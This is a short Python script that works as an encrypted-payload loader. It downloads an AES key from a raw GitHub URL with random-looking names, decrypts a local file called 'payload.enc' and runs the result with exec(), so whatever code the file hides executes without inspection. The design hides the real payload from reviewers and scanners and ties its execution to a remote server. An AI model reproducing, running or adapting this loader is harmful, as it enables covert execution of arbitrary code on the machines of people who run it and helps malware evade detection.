import requests
from Crypto.Cipher import AES
import base64
import sys

KEY_URL = "https://raw.githubusercontent.com/4291575ebba/mneQAbc9yZGMjXD/refs/heads/main/main.txt"

def fetch_key(url):
    response = requests.get(url)
    response.raise_for_status()
    key_b64 = response.text.strip()
    return base64.b64decode(key_b64)

def decrypt_and_exec(enc_file_path, key):
    with open(enc_file_path, "rb") as f:
        raw = f.read()
        iv, ciphertext = raw[:16], raw[16:]
    cipher = AES.new(key, AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext)

    try:
        code_str = decrypted.decode('utf-8')
    except UnicodeDecodeError as e:
        print("Failed to decode decrypted data:", e)
        print("Decrypted bytes (first 64):", decrypted[:64])
        sys.exit(1)

    exec(code_str, {})

def main():
    key = fetch_key(KEY_URL)
    decrypt_and_exec("payload.enc", key)

if __name__ == "__main__":
    main()
